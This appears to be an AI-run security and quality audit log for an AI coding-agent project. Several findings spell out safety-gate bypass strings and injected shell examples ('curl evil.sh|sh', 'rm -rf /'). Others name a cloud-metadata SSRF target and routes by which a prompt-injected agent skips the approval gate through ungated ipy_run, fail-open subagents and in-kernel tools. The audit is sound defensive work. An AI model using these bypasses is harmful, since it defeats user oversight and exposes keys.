title: os.Exit on p.Run error skips deferred s.Close, orphaning the node agent child
impact: When tea.NewProgram(m).Run() returns an error (e.g. terminal not a TTY, panic in the event loop), the spawned node agent/bin/mnemo.ts process is never killed and lingers with open pipes; repeated bad launches accumulate stray node processes holding credentials-loaded sessions
evidence: tui-go/cmd/mnemo/main.go:48-71 (defer s.Close() then os.Exit(1) at line 68-70; os.Exit does not run defers)
recommendation: Replace os.Exit with setting an exit code after p.Run: capture err, s.Close() explicitly (or run in a func with defers), then exit

title: one non-UTF8 stdin line silently kills memsrv (DoS)
impact: any single malformed frame containing invalid UTF-8 terminates the memory sidecar without an error reply; the pi extension loses its memory backend mid-session (DoS, restart loop if the frame is retried). No panic message, silent exit
evidence: memory-layer/src/bin/memsrv.rs:61 for line in stdin.lock().lines(); Err(_) => break
recommendation: on Err, write a JSON-RPC error reply and continue (skip the line) instead of break; only exit on EOF

title: search cache not invalidated after Unlink/Reweight/RecordOutcome despite via_graph scores depending on edge liveness and weight
impact: after unlink/reweight, a cached search hit can still return a stale via_graph result whose score/expansion the current graph would not produce — a memory consumer acts on graph paths that no longer exist (correctness/stale-read, not confidentiality)
evidence: memory-layer/src/cache.rs:99-108 touched_nodes returns vec![] for Unlink/Reweight/RecordOutcome, but search.rs expand() (line ~40) scores neighbours via e.alive_at(now) and e.weight.max(0.1)
recommendation: add edge ids (or both endpoints) to touched_nodes for Unlink/Reweight/RecordOutcome, or drop all cache entries flagged via_graph on edge-only ops

title: Call timeout leaks reader goroutine that eats later replies
impact: After one timed-out request, the orphaned goroutine keeps consuming lines from the shared pipe and discards ones whose id does not match its stale id; the next Call's reply can be swallowed by the old goroutine, so every subsequent memory request times out too (interface memory pane deadlocks against a once-slow sidecar; goroutines accumulate per timeout)
evidence: tui-go/internal/memory/memory.go:120-155 (select on time.After returns without stopping the spawned reader; next Call starts a second reader on same c.out)
recommendation: Make Call loop read the reply inline (the mutex already serialises calls), or tag the reader with a generation/quit channel so a timed-out call's goroutine stops before the next one starts

title: one corrupt/partial journal line causes total memory amnesia on every startup
impact: a crash mid-append or any single truncated/corrupted line makes the memory layer permanently forget its entire history on every restart; subsequent ops then reuse node ids from 1, corrupting replay for other journal consumers (memcli, TUI)
evidence: verified: journal with 1 valid CreateNode + 1 partial line -> ./target/debug/memsrv prints 'ready (0 ops)'; read_all (persist.rs:54-66) returns Err on first bad line, memsrv.rs:37 unwrap_or_default() discards ALL ops
recommendation: skip-and-log bad lines in read_all (mirroring how apply errors are already skipped in memsrv main) or stop at the first bad line keeping prior ops; memsrv must not unwrap_or_default the full history

title: record.py claims exclusive flock but never locks; concurrent auditors corrupt FINDINGS.jsonl and lose records
impact: Two concurrent  calls both load(), both rewrite the whole file; the loser's records vanish and interleaved writes leave a truncated line that makes EVERY subsequent record.py call die with 'FINDINGS.jsonl is corrupt' (exit 3) — the whole audit log becomes unwritable until manually repaired, and findings silently disappear
evidence: audit/record.py: docstring line 14 ('holds an exclusive flock') vs save() at lines 76-83 — full-file rewrite in 'w' mode with no fcntl.flock call anywhere (fcntl imported, never used); observed in run 3: torn partial line ('face-r3", "title": "run 3 started"...') and the complete 69e07ff5 marker record were lost while two other auditors' records appeared
recommendation: Hold fcntl.flock(LOCK_EX) around the load-modify-save sequence in add() (and use append-mode single-line writes instead of full rewrites), so concurrent writers serialise instead of clobbering

title: Journal.read_all takes no lock while append writes under fd-lock (reader can observe a writer's in-flight partial line)
impact: a memsrv/memcli starting while another client is mid-append can read a half-flushed line, hit the InvalidData path, and (combined with ab99acb1) drop the whole history; also two readers+writer have no ordering guarantee on ops read
evidence: persist.rs:29-39 append() opens path.lock and holds fd_lock write guard across write+flush; persist.rs:54-66 read_all() opens the journal directly with no lock at all
recommendation: read_all should take the same lock (shared/read guard) before scanning, or writers must write each line atomically (single write syscall, O_APPEND)

title: go test ./... red on working tree: 2 schedules tests fail
impact: AGENTS.md claim '329 green tests / go vet clean' no longer holds on the tree. TestSchedulesOverlayOpensAndStatesItsPurpose fails on lowercase 'schedules' (overlay renders uppercase 'SCHEDULES' header + 'every scheduled job' prose); TestHelpAndPaletteListSchedules fails because help/palette never list 'schedules and triggers' nor the ^o chord
evidence: app/schedules_test.go:42,185 (untracked, in-flight); go test ./... -> FAIL app 343 pass/2 fail, 13.2s
recommendation: schedules agent: add lowercase 'schedules' to overlay purpose line and register /schedules + ^o in keymap help/palette; go test ./... green before commit

title: run 3 started (testing & quality audit, glm-5.2)
impact: none; session marker for run 3 test audit (re-logged after FINDINGS race outage)
evidence: audit/record.py add
recommendation: n/a

title: record.py claimed exclusive flock but never locked; concurrent add() calls raced read-modify-write and corrupted FINDINGS.jsonl
impact: the single-writer guarantee of the audit hook was false — concurrent auditors could interleave, lose, or truncate each other's findings (exactly what happened mid-run-3, blocking all logging)
evidence: pre-fix record.py: docstring 'holds an exclusive flock' but add()/load()/save() never called fcntl.flock; observed live: line 2 of FINDINGS.jsonl became a 167-char truncated fragment of another auditor's entry, every command exited 3
recommendation: FIXED by orchestrator during run 3 (real flock across RMW, temp+os.replace, quarantine of damaged lines, repair subcommand); recording for the audit trail

title: internal/agent has zero tests (0% coverage) despite owning spawn/stream/interrupt contract
impact: The Agent interface boundary (Started/Think/Text/ToolStart/ToolEnd/Delegated/Done/Failed messages) is untested; a refactor or message-shape drift here breaks live-agent integration silently — app tests exercise it only via mocks elsewhere
evidence: go test -cover ./... -> 'internal/agent coverage: 0.0% of statements'; ls internal/agent = agent.go(91)+offline.go(28), no _test.go
recommendation: Add unit tests for offline.go (deterministic mock agent) and the message mapping in agent.go; even a table test over message types closes the gap

title: internal/markdown has zero tests (0% coverage)
impact: Glamour wrapper incl. the (content-lines, width) cache and invalidation-on-SetBody logic is unverified; a cache-key regression would render stale markdown with no test failing
evidence: go test -cover ./... -> 'internal/markdown coverage: 0.0% of statements'; markdown.go 198 lines, no _test.go
recommendation: Test Render caching (same content+width hits cache, SetBody invalidates) with a stub renderer interface

title: internal/prompt coverage only 25%
impact: History, queue, and completion paths largely untested; Suggest/Complete/HistoryPrev-Next regressions would surface as user-visible input bugs
evidence: go test -cover ./... -> prompt 25.0% of statements
recommendation: Table tests for history navigation and suggestion matching; the two-tier query logic already has precedent tests in command/overlay to copy from

title: Import blocklist covers only 3 builtins and misses computed specifiers
impact: node:os, node:net, node:https, node:dgram, node:tls, node:vm, node:worker_threads all import unchecked (vm + globals reach everything); import(("child"+"_process")) or import(["fs"].join("")) evades the literal-string regexes; the execute() body has unrestricted process/globalThis/fetch/process.binding regardless of imports
evidence: harness-engine/src/safety.ts:24-28 (DEFAULT_BLOCKED = {child_process, fs, fs/promises}) + literal-string regexes at 58-71
recommendation: Invert to an allowlist of importable modules — a blocklist cannot enumerate Node's dangerous surface; document that the gate is lexical-only and pair it with node --permission or a worker for real isolation

title: In-process unsandboxed tool execution: documented but unenforced at runtime
impact: createHarness input is LLM-generated tool source (attacker-influencable via prompt injection); once past the lexical gate it runs arbitrary JS with the host process's full rights — filesystem, network, and provider API keys in env. README says 'treat every registered bundle as trusted' but nothing enforces isolation at runtime
evidence: harness-engine/src/safety.ts:12-13 header ('NOT a sandbox ... full Node.js privileges inside this process'); registry.resolve(...).tool.execute() invoked directly — no worker/child_process/vm/permission flag anywhere in src/
recommendation: Execute tool modules in a worker_thread or child process started with node --permission plus a module allowlist, so a bypassed gate is not immediately arbitrary code execution

title: Relative and absolute import specifiers always pass the blocklist
impact: A tool whose submitted source imports nothing blocked can import ./helper.mjs shipped in the same bundle; the helper imports fs/child_process and is never scanned (only the submitted tool source is checked). The 'stays inside the bundle' assumption is enforced nowhere — both files execute in-process with full Node privileges. Concrete bypass: tool source 'import x from "./pwn.mjs"' with pwn.mjs containing 'import {execSync} from "child_process"'
evidence: harness-engine/src/safety.ts:77 — if (spec.startsWith(".") || spec.startsWith("/")) return false; comment 'relative refs stay inside the bundle'
recommendation: Resolve relative specifiers to disk and recursively apply checkToolSource to every reachable file in the bundle, or reject multi-file bundles outright

title: Watcher-loaded bundles bypass the safety gate entirely
impact: checkToolSource runs only on the createHarness path. Any manifest.json + tools/*.mjs dropped into a watched skills dir (project ./skills or ~/.agent/skills) is imported and executed in-process with no import blocklist and no syntax check — the gate is optional depending on which entry point created the bundle
evidence: harness-engine/src/watcher.ts:12,96 (imports only loadBundle; loadBundle→importToolFile does import() with no checkToolSource) vs create-harness.ts:51 where the gate is invoked
recommendation: Invoke checkToolSource inside loadBundle (or importToolFile) so every load path is gated, not just creation

title: Project/session bundle silently shadows a global tool of the same name
impact: A project-level skills dir (e.g. in a cloned third-party repo) can register a tool with the same name as a trusted global one; every resolution then picks the project tool with full in-process privileges. Combined with the ungated watcher load path, cloning a repo is sufficient to replace a vetted tool with arbitrary code. The shadowing is by design but not surfaced to the user or logs
evidence: harness-engine/src/types.ts:51 SCOPE_ORDER=[global,project,session]; registry.ts resolve() iterates reversed order, first hit wins — no warning or provenance check
recommendation: Log a warning when registration shadows an existing tool from a farther scope, and consider namespacing project tools (project:toolname) so shadowing is explicit

title: No realpath/symlink containment check on watched bundle dirs
impact: A symlink named like a valid bundle inside the watched skills dir points outside the intended tree and is still loaded and executed (fs.watch recursive + top-level segment as child); no check that the loaded content stays under the watched root
evidence: harness-engine/src/watcher.ts:24 NAME_RE, :84-103 #refresh — bundle dir = path.join(dir.path, name); no fs.realpath or containment verification anywhere
recommendation: fs.realpath the bundle dir before loadBundle and verify it remains under the watched root

title: Manifest tool refs are not constrained to the bundle dir
impact: A crafted manifest.json (e.g. dropped in a watched skills dir, which per the watcher finding is ungated) can set a tool ref to ../../outside.mjs or any absolute path and have harness-engine import() it as a tool module — arbitrary code load from anywhere on disk, no containment check against the bundle root
evidence: harness-engine/src/bundle.ts:132 — const fileAbs = path.resolve(dir, ref); then importToolFile(fileAbs) at 135 imports whatever path the manifest names
recommendation: After path.resolve, verify the result is inside the bundle directory (realpath containment check) and reject otherwise

title: synchronous OpenRouter embed with 4 retries blocks the single-threaded memsrv RPC loop for up to ~10.5s+
impact: any search over uncached node texts while OpenRouter is rate-limiting (429/503) stalls ALL memory RPC clients for the retry duration or the default socket timeout per attempt — a cheap remote-triggered DoS of the memory sidecar
evidence: remote.rs call_api(): loop 0..4 with sleeps 1500ms*(1<<n) = up to 10.5s total; embed() called inline from handle()/search/build_vectors in memsrv.rs; no request timeout configured on ureq::post
recommendation: set an explicit ureq timeout, move embedding off the RPC loop (or fail fast to hashing embedder after N misses), and bound retry total

title: No permissions block: workflow runs with default GITHUB_TOKEN permissions (zizmor flag)
impact: Every job, including ones that run third-party actions (dtolnay/rust-toolchain, Swatinem/rust-cache), gets whatever the repo default grants — on older/org repos that includes contents:write. A compromised action tag can then push branches/tags or edit repo contents with the workflow token
evidence: .github/workflows/ci.yml:1-16 — no permissions: key on workflow or any job; all jobs (memory-layer, agent, harness-engine, tui-go, secrets) inherit repo default token scopes
recommendation: Add a top-level permissions: {contents: read} (this CI only needs checkout) — matches the zizmor recommendation and is the cheapest supply-chain hardening available

title: Credential scan greps the checked-out tree only, not commit history
impact: A key committed and later removed (exactly the incident the comment cites) is invisible to this gate: git grep only examines files at HEAD. Historical leaks stay in the repo unfound while the gate reports green
evidence: .github/workflows/ci.yml:82-90 — git grep -nE ... over the working tree (fetch-depth: 0 fetches history but git grep never searches it); comment at :83 says 'a key reached a commit once already'
recommendation: Use git log -p --all piped to the same regex (or gitleaks/trufflehog with full clone) so removed-but-reachable secrets are caught

title: Credential scan regex misses OpenRouter (sk-or-v1-), github_pat_, and generic api_key shapes
impact: 'sk-or-v1-<32hex>' (OpenRouter — a provider Mnemo authenticates, per tui-go internal/auth Providers list) does NOT match: the hyphens in or/v1 break [A-Za-z0-9]{20,}. github_pat_... fine-grained PATs, gho_/gho tokens, and generic 'api_key = "<16+ chars>"' assignments are also invisible. A leak of any of these passes the gate green
evidence: .github/workflows/ci.yml:84-86 — pattern is only sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}
recommendation: Extend the pattern: sk-or-v1-[a-f0-9]{8,}, github_pat_[A-Za-z0-9_]{20,}, gho_[A-Za-z0-9]{20,}, and a generic (api[_-]?key|token)\s*[:=]\s*["'][A-Za-z0-9_-]{16,} row (with fixture exclusions kept in sync)

title: secrets gate matches its own redaction fixture and is red on main
impact: The secrets job fails on main (verified by running the exact gate command: exit 0 = match found = ::error + exit 1). A permanently-red security gate trains people to ignore it or widen exclusions until it goes green, which is how a real leak eventually slips past
evidence: .github/workflows/ci.yml:84-89 (git grep -nE '(sk-[A-Za-z0-9]{20,}|...)' -- ':!agent/test/trace.test.ts' ':!.github/workflows/ci.yml') — reproduced locally: same git grep hits agent/test/hooks_executor.test.ts:188 ('OPENAI_API_KEY=sk-abcdefghijklmnopqrstuvwxyz1234 leaked'), a tracked test fixture NOT in the exclusion list
recommendation: Add agent/test/hooks_executor.test.ts (or the fixture string) to the exclusion pathspec, or build the fake key so it cannot match (e.g. sk-TEST- not followed by 20 alnum)

title: CI installs JS deps with npm install instead of npm ci
impact: npm install may resolve newer versions than the lockfile records (or mutate the lockfile), so CI is not testing the pinned dependency set and a compromised or broken new transitive release can flow into CI runs unreviewed — supply-chain drift despite maintaining a lockfile
evidence: .github/workflows/ci.yml — 'agent' job: npm install (agent/), 'harness-engine' job: npm install; agent/package-lock.json exists (252 resolved entries) but is not enforced
recommendation: Use npm ci (or npm ci --ignore-scripts if feasible) in both jobs so the lockfile is authoritative

title: Actions pinned to mutable tags including third-party ones
impact: Tags are mutable references; two of the five are third-party (dtolnay, Swatinem) whose repos' tag movement or compromise redefines what CI executes with the workflow token. '@stable' additionally tracks a moving toolchain
evidence: .github/workflows/ci.yml — actions/checkout@v4, actions/setup-node@v4, actions/setup-go@v5, dtolnay/rust-toolchain@stable (job 'memory-layer'/'agent'), Swatinem/rust-cache@v2
recommendation: Pin all actions to full-length commit SHAs (actions/checkout@<sha> # v4 style), including the third-party ones

title: no bound on stdin frame size or journal growth — single huge line / op flood balloons memory
impact: one multi-MB stdin frame is fully buffered and parsed (memory spike on the sidecar); repeated remember/steer calls grow the journal and in-memory store without bound (disk/memory exhaustion over a long-lived session)
evidence: memsrv.rs:59-66 reads whole line then serde_json::from_str(&line) with no length cap; every RPC method appends ops to the journal with no quota (apply closure, memsrv.rs:137-148)
recommendation: cap line length (e.g. 1MB) before parse and reply with an error; consider a soft cap on ops per session or journal compaction trigger

title: remote embeddings exfiltrate all node text (labels, facts, queries) to OpenRouter when OPENROUTER_API_KEY is set
impact: by design (opt-in via env key), but memory fact values can contain sensitive project data; with the key set there is no redaction or opt-out per node before the text leaves the machine
evidence: remote.rs Embedder::embed (line ~84) posts {model, input:text} for every node_text (search.rs build_vectors embeds label + ALL active fact values + last-3 log entries) and every query
recommendation: document the data flow; consider a per-node 'private' flag or local-only embedder default for facts marked sensitive

title: pi event-stream contract tested only against hand-rolled JSON literals; upstream pinned with caret
impact: The TUI<->agent protocol is owned by an external npm package under a caret range; an npm update that renames/reshapes events keeps every test green in both repos while live TUI integration breaks — the same contract-drift class that already happened once between agent and memsrv
evidence: tui-go/internal/pi/pi_test.go:60-75 literal {"type":"message_update",...} strings; agent/package.json:33 "@earendil-works/pi-coding-agent": "^0.84.3"; no test in either repo pins both sides together
recommendation: Add one contract test: run agent/bin/mnemo.ts (or the pi package directly) with a stub model in CI and assert tui-go/internal/pi can parse every emitted event type; or pin the pi version exactly and bump deliberately

title: bin/mnemo.ts entrypoint (341 lines) has zero direct tests
impact: Arg-routing dispatch (--list-sessions, auth status/logout, traces, consolidate, schedule, pi passthrough) and ensureAuthenticated's provider fallback order are unverified; a regression in subcommand routing ships silently since CI never imports this file
evidence: grep -rln 'bin/mnemo' agent/test/ -> no matches; test/trace.test.ts imports src/trace.ts, not renderTraces from bin/mnemo.ts
recommendation: Extract the dispatch (already small pure functions: renderTraces is exported) into src/ and table-test the routing; keep bin/ a thin shim

title: auth.json write follows pre-planted symlinks (no lstat/realpath/O_NOFOLLOW before writing the API key)
impact: a symlink planted at ~/.mnemo/auth.json (by any prior local compromise or malicious repo script) redirects the user's freshly-entered API key into an attacker-chosen file, and chmods that file 0600; local single-user threat model keeps practical severity low
evidence: agent/src/auth/store.ts:66-72 saveAuth: fs.writeFileSync(file,...,{mode:0o600}) + chmodSync on a bare path.join(home,'.mnemo','auth.json') — no realpath/lstat/O_EXCL guard (contrast: bash_exec.ts:37 uses realpathSync for pwd)
recommendation: lstat the target first (reject if symlink), or open with fs.openSync(path, O_WRONLY|O_CREAT|O_EXCL, 0o600) pattern like the realpath guard already used elsewhere

title: run 3 ground truth: all four suites match claims at HEAD
impact: none; claims in AGENTS.md (329), plan.md (19), STATUS.md (74) verified truthful at HEAD; only working-tree red is the in-flight schedules feature (separate finding)
evidence: agent npm test 347/347 pass twice (~14s each, no hang); npx tsc --noEmit clean (0.8s); memory-layer cargo test 74/74 (2.4s); harness-engine npm test 19/19 first try (2.0s); tui-go HEAD export (git archive) go test 329/329 + go vet clean
recommendation: none; keep counts in docs updated on commit or add a drift check

title: npm test uses --test-force-exit, masking dangling-handle leaks
impact: A test that leaves a readline/child handle open still exits green, so the hang class from HANDOFF 6.3 regresses silently instead of failing CI; the flag converts a hang bug into a hidden leak
evidence: agent/package.json:11 'node --test --test-force-exit "test/*.test.ts"'
recommendation: Periodically run 'node --test test/*.test.ts' without the flag (e.g. weekly or in a non-required CI job) to surface lingering handles; fix any that appear

title: CI has no doc count-drift or graft freshness check; STATUS.md already drifted
impact: Test-count claims in AGENTS.md/STATUS.md rot silently as tests are added; a reader auditing coverage trust reads stale numbers; graft/ index staleness likewise unverified in CI (AGENTS.md relies on it for orientation)
evidence: ci.yml (95 lines) has jobs memory-layer/agent/harness-engine/tui-go/secrets only; STATUS.md:407 claims '346 tests, 345 pass' vs measured 347/347 (2026-08-31)
recommendation: Optional cheap step in one job: grep the claimed counts out of AGENTS.md/STATUS.md and compare against suite output, failing on drift; run 'graft build --check' if the CLI supports freshness validation

title: AGENTS.md prerequisite says go 1.22+ but tui-go requires go 1.27
impact: A contributor with go 1.22-1.26 follows the doc, then gets a confusing build failure from go.mod instead of a clear prerequisite message
evidence: AGENTS.md 'Prerequisites: go 1.22+' vs tui-go/go.mod:3 'go 1.27.0' and ci.yml tui-go job go-version '1.27'
recommendation: Update the AGENTS.md prerequisite line to 'go 1.27+ (matches tui-go/go.mod)'

title: ipy_run is not in GATED_TOOLS — arbitrary Python executes with no prompt under default permissions, making the bash/write approval gate bypassable
impact: in interactive mode the user is prompted before bash_exec/write_file/apply_edit, but a model (or injected prompt) can run 'ipy_run' unprompted and do everything bash could — or call tools.bash_exec from inside the kernel (also unprompted via the kernel dispatcher, sea-tools-inline.ts:57-60). The interactive approval guarantee is illusory for anyone who knows the escape hatch
evidence: approval-gate.ts:17 GATED_TOOLS={bash_exec,write_file,apply_edit}; decideApproval: action 'ask' (permissions.ts DEFAULT default:'ask') on a non-gated tool hits 'if (!GATED_TOOLS.has(ev.toolName)) return {}' = allow with no prompt; ipy_run gives full fs/network/process access from Python
recommendation: add ipy_run to GATED_TOOLS (prompt with a code summary), or make the default action for non-gated EXEC-class tools configurable to deny; at minimum document the bypass surface in the approval-gate header

title: spawn_subagent children are non-TTY so the approval gate fails open — delegated subagents run bash/write unprompted
impact: a model-authored subagent task executes bash_exec/write_file/apply_edit with zero interactive approval even while the parent session runs in interactive mode — the prompt the user trusts only covers the parent process. Default permissions deny nothing
evidence: subagent.ts:105-110 spawn(process.execPath,[cli,prompt],{stdio:['ignore','pipe','pipe']}) — child stdin is not a TTY; decideApproval (approval-gate.ts:85-86) returns {} when !tty, and spawn_subagent itself is not in GATED_TOOLS so spawning is never prompted either
recommendation: propagate an approval delegation token so the child consults the parent's confirm UI (or marks its output for retro-review); alternatively require interactive approval for spawn_subagent and force plan-mode-equivalent deny rules in children unless the operator opts out

title: bash allow-rule globs match the whole command string — 'ls*' auto-approves 'ls ; rm -rf /' (shell interpolation bypass)
impact: any operator convenience rule like {tool:'bash_exec',pattern:'git *',action:'allow'} silently auto-approves injected sub-commands ('git status; curl evil.sh|sh') — the allow action trusts a glob over an unparsed shell line
evidence: permissions.ts:79 subjectOf(bash_exec)=entire command string; permissions.ts:88-97 globMatch turns 'ls*' into /^ls.*$/s; bash_exec.ts:69-72 spawns the command verbatim with shell:true
recommendation: for bash_exec, match allow rules against the first word (or a tokenized command) rather than the raw line, or warn loudly in permissions.json docs that bash patterns must be exact-command; deny rules are unaffected

title: web_fetch has no SSRF filter — localhost/private/metadata IPs allowed and redirects are followed
impact: a prompt-injected model can fetch http://169.254.169.254/ (cloud metadata), local admin panels (localhost:port), or internal services and exfiltrate the response body back into the transcript; redirect-follow means an allowed-looking external URL can bounce to internal targets
evidence: web.ts:68-79 assertFetchableUrl only validates the scheme (http/https); web.ts:87 doFetch(parsed.href,{redirect:'follow'}) — no hostname/IP allowlist, no block of 127.0.0.1/10.x/192.168.x/169.254.169.254, and cross-host redirects are followed
recommendation: resolve the host and reject private/loopback/link-local ranges (and re-check after each redirect with redirect:'manual'), unless an env flag opts into intranet fetching

title: no path containment in file tools — resolveInWorkspace passes absolute paths straight through, no symlink canonicalization or ../ check
impact: the name promises a workspace jail that does not exist: an LLM (or injected instruction) can read ~/.ssh keys or write outside the repo via absolute paths or symlinked relatives; even a future prefix check would be escapable since symlinks are never canonicalized before comparison
evidence: workspace.ts:14-19 resolveInWorkspace: path.isAbsolute(p)?p:path.resolve(root,p) — no prefix comparison, no realpath; used by read_file/write_file/apply_edit/read_image; glob_list.ts:19 path.resolve(params.root)
recommendation: either document that paths are uncontained (rename to resolvePath), or add a real jail: realpathSync both root and target then prefix-compare, with an explicit escape hatch parameter that itself triggers the approval prompt

title: stored API key injected into process.env is inherited by every child — approved shell command 'env' exfiltrates the provider key
impact: any approved bash_exec command, spawned subagent, MCP server, or Python cell can read the plaintext provider API key from its environment and exfiltrate it over the network — the key's exposure scope is 'every process the agent ever spawns'
evidence: mnemo.ts:135,163 process.env[envName]=r.key (ensureAuthenticated); children inherit it: subagent.ts:109 and mcp.ts:95 spread {...process.env}; bash_exec spawn and the ipy kernel inherit the default env; only the memsrv sidecar scrubs a single var (hooks/memory.ts:86-89 deletes OPENROUTER_API_KEY only)
recommendation: stop mutating process.env with the stored key: pass it only to the specific provider client; give children a filtered env (drop *_API_KEY/*_TOKEN) except where explicitly required; scrub all known key vars in the memsrv spawn, not just OPENROUTER

title: trace redaction misses URL-embedded tokens and non-listed key shapes; up to 120 chars of tool arguments persisted verbatim
impact: logs at ~/.mnemo/logs/<date>.jsonl can persist credentials the agent handled (tokens in fetched URLs, third-party keys embedded in commands) — these logs outlive the session and are the first thing attached to a bug report
evidence: trace.ts:61-117 SECRET_VALUE covers only sk-/ghp_/xox*/AKIA shapes plus values equal to currently-set env secrets; agent/extensions/tracing.ts:27 stores string tool args verbatim up to 120 chars; URL query params like ?api_key=... or formats like sk-or-/tvly-/Bearer <jwt> in args are not matched
recommendation: extend redaction: parse URL-shaped strings and drop/scrub query params named api_key/token/access_token/secret; add sk-or- and tvly- prefixes; consider redacting all arg values that match high-entropy strings

title: harness safety gate trivially bypassed (backtick specifiers, runtime concat, process global, node:http) — in-process unsandboxed execution is a documented risk class
impact: an LLM-generated tool that passes the gate executes as the agent's own process with full fs/network/env access — the gate is a tripwire, not a boundary; a prompt-injected create_harness yields arbitrary code execution as the user with no sandbox
evidence: safety.ts:24-27 DEFAULT_BLOCKED={child_process,fs,fs/promises} only; extractImportSpecifiers regexes (safety.ts:50-71) match only ["'] quotes so require(\) and import("child"+"_process") pass; process/globalThis need no import; node:http/net/os are not blocked; header (safety.ts:12-31) admits 'it is NOT a sandbox' and execute() runs with full Node privileges in-process via dynamic import (bundle.ts:77-87 importToolFile)
recommendation: acknowledged in-code; act on its own recommendation — run registered tool bundles in a child process or worker with node --permission (or a container), keeping the in-process path as an explicit opt-in

title: concrete safety-gate bypass strings that pass checkToolSource (enumeration for 56b733fa)
impact: any of the four gives a generated tool full in-process privileges (fs/network/exec) despite a green safety report
evidence: verified against extractImportSpecifiers (safety.ts:50-71) and isBlockedSpecifier (safety.ts:73-81): (1) require(`child_process`) with backticks — regexes only match single/double quotes; (2) await import("child"+"_process") — dynamic regex needs a full quoted literal; (3) no import at all: process.binding / globalThis.process reachable directly; (4) await import("node:http") — network builtins not in DEFAULT_BLOCKED
recommendation: treat the gate as a lint, not a boundary; see 56b733fa — isolate execution (worker/child with --permission or container)

title: safety gate not re-run when loading bundles from disk — only the LLM-generated create_harness path is checked
impact: a bundle that was hand-edited (or planted by malware/another agent) after creation, or placed directly in the skills directory, is imported into the agent process with zero import-blocklist review — the gate protects exactly the path that generates source, not the path that persists and reloads it
evidence: grep: checkToolSource is called only at create-harness.ts:51; loadBundle (bundle.ts:117+, used by watcher.ts and cli.ts to load persisted skill bundles) imports tool files via importToolFile (bundle.ts:77-87) with no checkToolSource — it even imports checkToolSource at bundle.ts:13 without calling it
recommendation: run checkToolSource (plus a manifest-trust check) inside loadBundle before importToolFile, or record a per-file hash at creation time and refuse to load modified files

title: in-kernel tools.* calls skip interactive prompting by design (confirm: async()=>true, tty:false) — deny rules and plan mode are the only brakes from notebook code
impact: once a cell is running, tools.bash_exec / tools.write_file execute with no user prompt even in interactive mode; combined with ipy_run itself being ungated (0384ee03), the model has a two-hop path to un-prompted shell execution that users will not expect
evidence: sea-tools-inline.ts:54-62: makeKernelDispatcher(..., decideApproval(..., {confirm: async()=>true}, env, false, perms)) — hardcoded tty:false; design comment at :52-53 says prompting is impossible from in here; decideApproval only prompts when mode=interactive AND tty
recommendation: documented as deliberate — but consider queueing in-kernel gated-tool calls back to the host UI for confirmation (the bridge is already async), or default-denying gated tools when invoked from the kernel unless an env flag opts in

title: hook executor runs arbitrary sh -c commands with no default timeout and no scope confinement — any manifest landing in a scanned dir is full user-level execution
impact: hooks are documented 'trusted user scripts', but manifests are loadable from skill/plugin directories — a malicious repo or plugin that ships a hook manifest gets immediate full shell execution as the agent's user on the next matching event, with no timeout bound
evidence: executor.ts:139-143 spawn('sh',['-c',command]); timeout only if hook.timeout>0 set (executor.ts:134-141, else null); resolveCommand (:97-108) allows absolute paths and ../ freely; env = req.env ?? process.env (:149); types.ts:75 'network' is declared intent, not enforced
recommendation: require operator confirmation (or a signed/allowlisted manifest) before first execution of a newly discovered hook, default the timeout to something finite, and consider restricting cwd/paths to the manifest scope root

title: hook block-reason (first 400 chars of hook stdout/stderr) is persisted to trace logs — a channel for arbitrary data past redaction
impact: a hook (or content the hook echoes, e.g. a secret it read from tool args) can plant arbitrary strings into ~/.mnemo/logs/<date>.jsonl that outlive the session — redaction is pattern-based and this path feeds it unstructured text
evidence: executor.ts blockReason (~:66-76) takes the first 400 chars of hook output; engine.ts auditInvocation (~:127-137) records it via Tracer.event; trace.ts redact() only scrubs known key shapes/env-secret values, not arbitrary echoed content
recommendation: cap or hash hook output in the audit record, or run blockReason through the same redaction applied to values plus a generic high-entropy scrub

title: kernel has no memory/process resource limits — per-cell wall-clock timeout only, and SIGKILL does not reap cell-spawned subprocesses
impact: a single cell (or prompt-injected cell) can fork-bomb or exhaust memory between timeouts; respawning the kernel after each timeout repeats the damage indefinitely in a loop
evidence: grep across agent/: no ulimit/setrlimit/cgroup anywhere; ipy_run.ts:125-147 timeout (default 120s) SIGKILLs and respawns the kernel; nothing bounds allocation or forks, and Popen children survive the kernel kill
recommendation: launch the kernel with resource limits (rlimit via preexec, or spawn through a wrapper that sets RLIMIT_AS/RLIMIT_NPROC), and kill the whole process group on timeout

title: mcp stop() SIGTERMs the server and nulls the handle — a SIGTERM-resistant server lingers as an orphan with inherited env
impact: an unresponsive or malicious MCP server that ignores SIGTERM keeps running detached after the agent exits, still holding the parent environment it inherited at spawn
evidence: mcp.ts:242-247 stop(): stdin end + proc.kill() (SIGTERM default) then this.proc=null; servers spawned with {...process.env} (mcp.ts:95,139-143) so they hold any inherited secrets
recommendation: escalate to SIGKILL after a grace period (proc.kill('SIGKILL') on a timer) before nulling the reference

title: tools._stdin/_stdout raw pipe objects reachable from notebook code (real instance attrs bypass the _-blocking __getattr__)
impact: not a host-spoofing vector (forged tool_result frames on stdout are ignored by the host, verified ipy_run.ts:107-131), but submitted code gets direct access to the kernel RPC pipes — an intended-hidden internal surface that is readable and writable
evidence: ipy_bridge.py:36-38 ToolProxy uses object.__setattr__ for _stdin/_stdout; __getattr__ (which blocks _-prefixed names) only fires on MISSING attributes, so tools._stdin/tools._stdout resolve to the real pipe objects
recommendation: store the pipes in a closure or module-level secret rather than as instance attributes if they are meant to be unreachable

title: run 3 complete (glm-5.2) — 25 findings across all 10 scope areas, session survived
impact: none - audit trail marker; proves run 3 finished after the mid-run hook outage and repair
evidence: audit/record.py list --agent audit-sec-backend-r3 | wc -l = 25; 2 high / 10 medium / 11 low / 2 info (original start-marker 1a65d955 was lost in the FINDINGS.jsonl repair)
recommendation: orchestrator triage: top items 0384ee03 (ipy_run ungated) and b6afa93e (subagent fail-open) break the interactive approval guarantee as a pair
